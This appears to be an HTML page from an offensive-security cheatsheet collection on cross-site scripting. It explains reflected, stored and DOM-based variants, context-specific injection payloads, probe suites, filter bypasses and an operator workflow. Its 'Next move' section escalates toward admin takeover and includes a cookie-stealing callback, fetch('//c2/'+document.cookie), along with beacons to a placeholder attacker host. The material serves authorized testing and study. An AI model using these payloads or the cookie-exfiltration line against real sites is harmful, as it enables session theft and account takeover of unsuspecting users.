@@ -1,0 +1,335 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Cross-Site Scripting · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../index.html">Cheatsheets</a> › Web › XSS</nav><h1>Cross-Site Scripting</h1><p class="cx-lede">Operator reference for cross-site scripting - the three vulnerability classes (reflected, stored, DOM-based), context-aware payload crafting (HTML body vs attribute vs JavaScript vs URL vs CSS), filter bypass techniques, blind XSS in admin-only renderers, and the canonical exploitation paths from initial JavaScript execution to session theft, CSRF chaining, and full account takeover.</p><div class="cx-tags"><span class="cx-tag">MITRE T1059.007, T1185, T1539</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT SessionTakeover, CredentialTheft, AccountTakeover, AdminCompromise</span><span class="cx-tag">OWASP A05, A07</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>XSS is JavaScript execution in someone else's browser session - your code, their cookies, their session. The vulnerability exists when an application takes untrusted input and renders it as part of executed content (HTML, JavaScript, CSS) without proper context-aware encoding. The three variants differ by <em>where</em> the injection lives; the post-execution mechanics (session theft, CSRF chain, keylogger, defacement) are the same.</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Reflected - input echoed straight back in the response
+http://target/search?q=&lt;script&gt;alert(1)&lt;/script&gt;
+→ &lt;p&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;
+
+# 2. Stored - input persisted server-side, rendered later
+POST /comment {&quot;text&quot;: &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;}
+→ Every page view of the comment thread executes the script
+
+# 3. DOM-based - purely client-side; server never sees the payload
+http://target/#&lt;img src=x onerror=alert(1)&gt;
+→ document.write(location.hash) renders the fragment as HTML
+
+# 4. The execution context determines the payload shape
+&lt;input value=&quot;HERE&quot;&gt;         → &quot; onmouseover=alert(1) x=&quot;
+&lt;script&gt;var x = &quot;HERE&quot;;&lt;/script&gt;  → &quot;; alert(1); //
+&lt;a href=&quot;HERE&quot;&gt;              → javascript:alert(1)
+&lt;body bgcolor=&quot;HERE&quot;&gt;        → &quot; onload=alert(1) x=&quot;</code></pre></figure>
+<p>Success indicator: a JavaScript expression of your choice executes in the victim's browser when they visit the crafted URL or view the poisoned content. The proof-of-concept is <code>alert(document.domain)</code> (proves same-origin execution); real impact follows from there.</p>
+<h2 id="why-xss-is-more-than-alert1">Why XSS is more than <code>alert(1)</code></h2>
+<p>The textbook proof is a popup. The real impact is whatever JavaScript can do, which on a logged-in victim's session is essentially everything:</p>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>Mechanism</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read session cookies</td>
+<td><code>document.cookie</code> (if not HttpOnly)</td>
+</tr>
+<tr>
+<td>Read CSRF tokens</td>
+<td>DOM scrape - tokens render into HTML somewhere</td>
+</tr>
+<tr>
+<td>Forge requests as victim</td>
+<td><code>fetch()</code> with the victim's cookies auto-sent by browser</td>
+</tr>
+<tr>
+<td>Read victim's email / messages</td>
+<td>If the same origin hosts a webmail / chat app</td>
+</tr>
+<tr>
+<td>Capture keystrokes</td>
+<td><code>addEventListener('keydown', ...)</code></td>
+</tr>
+<tr>
+<td>Screenshot the page</td>
+<td><code>html2canvas</code> library, exfil image</td>
+</tr>
+<tr>
+<td>Pivot to internal network</td>
+<td><code>fetch('http://192.168.1.1/...')</code> if the victim is inside the network</td>
+</tr>
+<tr>
+<td>Trigger downloads / drive-by</td>
+<td>Force download of attacker-controlled files</td>
+</tr>
+<tr>
+<td>Persistence</td>
+<td>Service workers, IndexedDB-stored payloads</td>
+</tr>
+</tbody>
+</table>
+<p>The XSS itself is the foothold; everything else is what you do from inside the browser.</p>
+<p>For the canonical session-theft exfiltration pattern, see <a href="../sessions/xss-to-session/index.html">XSS to session</a> - <code>document.cookie</code> extraction, cookie-logger PHP receiver, modern callback infrastructure.</p>
+<h2 id="the-three-variants">The three variants</h2>
+<table>
+<thead>
+<tr>
+<th>Variant</th>
+<th>Where the payload lives</th>
+<th>Victim model</th>
+<th>Impact ceiling</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Reflected</strong></td>
+<td>URL parameter, form field, header</td>
+<td>Victim clicks an attacker URL</td>
+<td>Per-click; needs social engineering</td>
+</tr>
+<tr>
+<td><strong>Stored</strong></td>
+<td>Database (comment, profile, ticket)</td>
+<td>Anyone who views the poisoned page</td>
+<td>Mass exploitation; possibly admin-targeted</td>
+</tr>
+<tr>
+<td><strong>DOM-based</strong></td>
+<td>Pure client-side; payload in URL fragment, <code>localStorage</code>, <code>postMessage</code></td>
+<td>Same as reflected</td>
+<td>Stealthy - server logs never see the payload</td>
+</tr>
+</tbody>
+</table>
+<p>Operators look for all three; the same application often has multiple variants in different fields.</p>
+<p>For deep treatment of each:</p>
+<ul>
+<li><a href="reflected/index.html">Reflected XSS</a> - URL parameter echo, three rendering contexts</li>
+<li><a href="stored/index.html">Stored XSS</a> - persistent injection, victim modeling, chained impact</li>
+<li><a href="dom-based/index.html">DOM-based XSS</a> - source-to-sink analysis, postMessage attacks</li>
+</ul>
+<h2 id="context-theory">Context theory</h2>
+<p>The most important XSS concept and the one that distinguishes operators who consistently exploit XSS from operators who paste <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> and give up.</p>
+<p>When your input lands in a response, ask: <em>what kind of content is the parser already in?</em> The browser parses HTML in different modes depending on context. A payload that works in one context fails or does nothing in another.</p>
+<h3 id="the-five-contexts">The five contexts</h3>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- 1. HTML body context - between tags --&gt;
+&lt;div&gt;HERE&lt;/div&gt;
+→ Payload needs to open a new tag: &lt;script&gt;alert(1)&lt;/script&gt;
+
+&lt;!-- 2. HTML attribute context - inside an attribute value --&gt;
+&lt;input type=&quot;text&quot; value=&quot;HERE&quot;&gt;
+→ Payload needs to break out of the attribute first: &quot; onmouseover=alert(1) x=&quot;
+
+&lt;!-- 3. JavaScript context - inside a &lt;script&gt; block --&gt;
+&lt;script&gt;
+  var username = &quot;HERE&quot;;
+&lt;/script&gt;
+→ Payload needs to break out of the JS string: &quot;; alert(1); //
+
+&lt;!-- 4. URL context - inside a URL-accepting attribute --&gt;
+&lt;a href=&quot;HERE&quot;&gt;click&lt;/a&gt;
+→ Payload uses the javascript: pseudo-scheme: javascript:alert(1)
+
+&lt;!-- 5. CSS context - inside a &lt;style&gt; block or style attribute --&gt;
+&lt;style&gt;body { color: HERE; }&lt;/style&gt;
+→ Payload uses CSS-injection or expression(): (modern browsers limit this heavily)</code></pre></figure>
+<p>A reflected XSS that doesn't fire often isn't actually filtered - it's just in a context where the obvious payload doesn't work. Inspecting the page source to see the exact surrounding markup is the difference between "the WAF blocks me" and "I'm sending the wrong payload class."</p>
+<h3 id="demonstration-of-context-sensitivity">Demonstration of context-sensitivity</h3>
+<p>Three identical-looking reflections, three different correct payloads:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;!-- Reflection 1: visible body --&gt;
+Your search returned: HERE
+→ &lt;script&gt;alert(1)&lt;/script&gt;            ✓ works
+→ &quot; onerror=alert(1) x=&quot;              ✗ no attribute to break out of
+
+&lt;!-- Reflection 2: hidden input --&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;csrf&quot; value=&quot;HERE&quot;&gt;
+→ &lt;script&gt;alert(1)&lt;/script&gt;            ✗ inside attribute value; &lt;script&gt; is text
+→ &quot; onfocus=alert(1) autofocus x=&quot;    ✓ breaks out, adds new attribute
+
+&lt;!-- Reflection 3: JSON variable in script --&gt;
+&lt;script&gt;var data = &quot;HERE&quot;;&lt;/script&gt;
+→ &lt;script&gt;alert(1)&lt;/script&gt;            ✗ the inner &lt;script&gt; tag is text inside an attribute
+→ &quot;; alert(1); var z=&quot;                ✓ breaks string, terminates statement, comments</code></pre></figure>
+<p>The reflected value looks the same in all three. The page source - the markup around the reflection - is what determines which payload works.</p>
+<p>See <a href="payload-construction/index.html">Payload construction</a> for the full context-aware payload catalog.</p>
+<h2 id="what-this-cluster-covers">What this cluster covers</h2>
+<table>
+<thead>
+<tr>
+<th>Page</th>
+<th>Focus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a href="reflected/index.html">Reflected</a></td>
+<td>URL parameters echoed into responses; canary probing; per-context exploitation</td>
+</tr>
+<tr>
+<td><a href="stored/index.html">Stored</a></td>
+<td>Persistent injection sinks (comments, bios, support tickets, filenames); victim modeling for admin-targeted attacks</td>
+</tr>
+<tr>
+<td><a href="dom-based/index.html">DOM-based</a></td>
+<td>Source-to-sink JavaScript analysis; common sources/sinks; postMessage attacks; DOM-Invader</td>
+</tr>
+<tr>
+<td><a href="payload-construction/index.html">Payload construction</a></td>
+<td>Context-aware payload crafting; the catalog organized by context; polyglot payloads; minimal payloads under length restrictions</td>
+</tr>
+<tr>
+<td><a href="filter-bypasses/index.html">Filter bypasses</a></td>
+<td>WAF evasion; case juggling; encoding; alternative event handlers; quote-/paren-/space-free JS; CSP bypass paths</td>
+</tr>
+<tr>
+<td><a href="blind-xss/index.html">Blind XSS</a></td>
+<td>XSS that fires in admin-only contexts; XSSHunter/Interactsh setup; out-of-band callback patterns</td>
+</tr>
+<tr>
+<td><a href="capstone-chain/index.html">Capstone chain</a></td>
+<td>Capstone - reflected to stored to blind, then chain to CSRF for admin takeover</td>
+</tr>
+<tr>
+<td><a href="defense/index.html">Defense</a></td>
+<td>Context-aware output encoding, framework auto-escaping, CSP and Trusted Types, sanitization, and the controls that only reduce risk</td>
+</tr>
+</tbody>
+</table>
+<h2 id="what-this-cluster-does-not-cover">What this cluster does NOT cover</h2>
+<p>XSS overlaps with several other vulnerability classes. Each lives in its own cluster:</p>
+<table>
+<thead>
+<tr>
+<th>Topic</th>
+<th>Lives in</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Session cookie theft via XSS</td>
+<td><a href="../sessions/xss-to-session/index.html">XSS to session</a> - the post-XSS exfiltration mechanics</td>
+</tr>
+<tr>
+<td>Combining XSS with CSRF (CSRF token bypass)</td>
+<td><a href="../sessions/xss-csrf-chain/index.html">XSS+CSRF chain</a></td>
+</tr>
+<tr>
+<td>Open redirect → XSS escalation</td>
+<td><a href="../sessions/open-redirect/index.html">Open redirect</a></td>
+</tr>
+<tr>
+<td>Self-XSS that requires the victim to paste a payload</td>
+<td>Not vulnerability-class XSS; ignored unless escalated to clickjacking</td>
+</tr>
+<tr>
+<td>Server-side template injection (looks like XSS but executes server-side)</td>
+<td><a href="../server-side/ssti/index.html">SSTI cluster</a></td>
+</tr>
+<tr>
+<td>Markdown → XSS</td>
+<td>Covered in <a href="reflected/index.html">Reflected XSS</a> as a context variant</td>
+</tr>
+</tbody>
+</table>
+<p>When you find XSS that immediately escalates (e.g., cookies aren't HttpOnly, or CSRF tokens are scrape-able), use this cluster for the XSS itself and the linked clusters for the escalation.</p>
+<h2 id="tooling-note">Tooling note</h2>
+<p>A few tools recur across this cluster:</p>
+<table>
+<thead>
+<tr>
+<th>Tool</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Burp Suite Repeater</td>
+<td>Iterating payload variants; observing exact reflected output</td>
+</tr>
+<tr>
+<td>Burp Suite Intruder</td>
+<td>Filter-bypass payload sets; rapid context testing</td>
+</tr>
+<tr>
+<td>DOM-Invader (Burp browser extension)</td>
+<td>DOM source-to-sink analysis automation</td>
+</tr>
+<tr>
+<td><a href="https://github.com/s0md3v/XSStrike">XSStrike</a></td>
+<td>Context-aware payload generation and reflected XSS discovery</td>
+</tr>
+<tr>
+<td><a href="https://github.com/epsylon/xsser">XSSer</a></td>
+<td>Automated XSS discovery + exploitation; fuzzes form fields (<code>xsser -u URL -g "/?p=XSS"</code>)</td>
+</tr>
+<tr>
+<td><a href="https://github.com/mandatoryprogrammer/xsshunter-express">XSS Hunter Express</a></td>
+<td>Self-hosted blind XSS callback infrastructure</td>
+</tr>
+<tr>
+<td><a href="https://beefproject.com/">BeEF (Browser Exploitation Framework)</a></td>
+<td>Post-XSS payload framework; mature but conspicuous</td>
+</tr>
+<tr>
+<td>Burp Collaborator / Interactsh</td>
+<td>OOB callback for blind XSS</td>
+</tr>
+</tbody>
+</table>
+<p><a href="https://github.com/s0md3v/XSStrike">XSStrike</a> is particularly useful for context discovery - it identifies the exact rendering context of your input and recommends payloads. Run it before crafting manually.</p>
+<p>General web-app scanners (Nessus, Burp Pro, OWASP ZAP) also flag XSS, through a <strong>passive scan</strong> (reads client-side code for DOM-based sinks) and an <strong>active scan</strong> (injects payloads and diffs the reflected source). Whatever the tool - XSStrike, XSSer, Brute XSS, or a full scanner - a reflected payload isn't always an <em>executed</em> one, so verify every hit by hand.</p>
+<h2 id="a-note-on-scriptalert1script-blindness">A note on <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> blindness</h2>
+<p>Many tutorials use <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> as the universal probe. It's a reasonable starting point but has three blind spots:</p>
+<ol>
+<li>
+<p><strong>It doesn't fire in inline contexts</strong>. Inside <code>&lt;input value="..."&gt;</code> or <code>&lt;script&gt;var x="...";&lt;/script&gt;</code>, the literal <code>&lt;script&gt;</code> tag becomes text within the attribute/string. A scriptless XSS detector misses these.</p>
+</li>
+<li>
+<p><strong>CSP <code>script-src</code> directives block inline scripts</strong>. Many modern apps allow event handlers but not inline <code>&lt;script&gt;</code> tags. The detector miss-classifies these as "no XSS."</p>
+</li>
+<li>
+<p><strong>It runs once</strong>. If you need the payload to fire on a specific event (form submission, page navigation), <code>&lt;script&gt;</code> won't catch it.</p>
+</li>
+</ol>
+<p>Better universal probe payloads - each tests a different vector:</p>
+<figure class="cx-code"><figcaption>html</figcaption><pre><code class="language-html">&lt;svg onload=alert(1)&gt;                          &lt;!-- works in body context; no &lt;script&gt; needed --&gt;
+&quot;&gt;&lt;img src=x onerror=alert(1)&gt;                 &lt;!-- breaks attribute then injects --&gt;
+&#x27;;alert(1);//                                  &lt;!-- breaks JS string --&gt;
+javascript:alert(1)                            &lt;!-- works in href --&gt;
+&quot;&gt;&lt;svg/onload=alert(/XSS/)&gt;                    &lt;!-- shorter, evades some filters --&gt;</code></pre></figure>
+<p>Cycle through these as your initial canary suite. The one that fires reveals the context. See <a href="payload-construction/index.html">Payload construction</a> for the full catalog.</p>
+<p>When <code>alert()</code> doesn't fire, work out <em>why</em> first. If the page merely blocks the <code>alert</code> function, <code>print()</code>, <code>prompt()</code>, or <code>confirm()</code> are drop-in stand-ins. But a <strong>sandboxed iframe without <code>allow-modals</code></strong> blocks all four, so they're no help there. When modals are out, the reliable confirmation is a <strong>non-modal execution marker</strong>: have the payload call back to a listener (<code>new Image().src='//&lt;ATTACKER&gt;/x'</code> or <code>fetch('//&lt;ATTACKER&gt;/x')</code>) or make a visible DOM change - the callback proves JavaScript actually <em>ran</em>. And note <code>&lt;plaintext&gt;</code> only proves your markup was <strong>injected</strong> - it halts HTML rendering and dumps the rest as raw text, confirming HTML injection, not JavaScript execution.</p>
+<h2 id="operator-workflow">Operator workflow</h2>
+<p>The standard XSS discovery flow:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1. Map input vectors
+   → Every URL parameter, form field, HTTP header reflected anywhere in any response
+2. Send unique canary per input
+   → &quot;xss123abc&quot; - easy to grep for in responses, no encoding interference
+3. For each reflection found, inspect surrounding markup
+   → View source at the reflection location; identify context
+4. Craft context-appropriate payload
+   → See [Payload construction]
+5. Test payload; iterate on filter bypasses if blocked
+   → See [Filter bypasses]
+6. Confirm execution
+   → alert(document.domain) - proves same-origin
+7. Decide on impact escalation
+   → Session theft / CSRF chain / blind XSS to admin / data exfil</code></pre></figure>
+<p>The pattern is mechanical once internalized. The variable is the context - every distinct reflection deserves its own payload analysis.</p>
+<h2 id="next-move">Next move</h2>
+<ul>
+<li><strong><code>&lt;svg onload=alert(1)&gt;</code> fires immediately</strong> → confirmed reflected XSS in HTML body context; escalate to session theft via <code>fetch('//c2/'+document.cookie)</code></li>
+<li><strong>Payload reflected but escaped (HTML entities)</strong> → check different output contexts (attribute, JS string, URL); the input may be unescaped in one of them</li>
+<li><strong>Reflection inside a JavaScript string</strong> → break out with <code>';alert(1);//</code>, then re-enter the string to avoid breaking the page</li>
+<li><strong>Reflection inside an <code>href</code>/<code>src</code> attribute</strong> → try <code>javascript:alert(1)</code> payloads; many filters miss URL-context injection</li>
+<li><strong>Stored input but no visible execution</strong> → check if rendering happens elsewhere (admin panel, email notification, report PDF) - classic blind XSS surface; use a beacon like XSSHunter or your own webhook</li>
+<li><strong>Payload blocked by WAF</strong> → encode (HTML/URL/Unicode), use rare tags (<code>&lt;details ontoggle&gt;</code>, <code>&lt;dialog onclose&gt;</code>), switch context (try the payload as URL param vs POST body vs cookie)</li>
+<li><strong>JavaScript executing but <code>httpOnly</code> cookies</strong> → escalate via in-browser CSRF chain (use the user's session to make authenticated requests from their browser), or extract data from the rendered DOM</li>
+<li><strong>Got admin cookie / session</strong> → log in as admin, look for <a href="../uploads/index.html">file upload</a> endpoints for RCE, or settings pages with command-execution functionality</li>
+<li><strong>Modern app with strict CSP blocking inline scripts</strong> → look for CSP bypasses (JSONP endpoints, allowed CDN with dangerous content), or chain with another vuln to overcome it</li>
+</ul></article><nav class="cx-pager"><a class="cx-next" href="reflected/index.html">Next: Reflected XSS</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../license.html">License</a></p></footer>
+<script src="../../../codex.js"></script></body></html>
